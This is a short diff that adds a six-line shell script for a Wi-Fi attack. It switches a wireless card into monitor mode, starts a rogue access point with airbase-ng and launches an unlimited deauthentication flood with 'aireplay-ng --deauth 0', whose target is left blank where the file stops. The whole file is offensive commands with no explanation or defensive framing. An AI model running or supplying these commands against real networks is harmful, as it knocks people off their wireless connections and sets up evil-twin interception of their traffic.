@@ -1,0 +1,6 @@
+ifconfig wlp3s0 down
+iwconfig wlp3s0 mode monitor
+ifconfig wlp3s0 up
+
+airbase-ng -a MAC --essid "" -c mon0
+aireplay-ng --deauth 0 -a
